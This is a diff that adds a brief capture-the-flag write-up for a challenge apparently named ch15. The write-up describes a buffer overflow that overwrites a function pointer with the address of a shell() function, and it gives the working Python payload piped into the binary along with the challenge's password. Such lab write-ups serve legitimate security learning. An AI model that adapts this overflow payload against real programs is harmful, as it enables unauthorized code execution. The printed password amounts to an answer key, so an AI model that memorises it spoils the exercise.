@@ -40,4 +40,10 @@ void main()
     func();
 }
 ```
+## Write-up:
+- As a normal code flow, the program will point to the address of **sub()** function and execute it. So we need to override the "ret addr" and point it to **shell()** function. 
+- First we will fill the **buf**'s value with 128 "A" characters, and then push the address of the **shell()** function.  
+### Solution:
+Payload: (python -c "print('a'*128+'\x16\x85\x04\x08')";cat) | ./ch15
+Password: B33r1sSoG0oD4y0urBr4iN
 
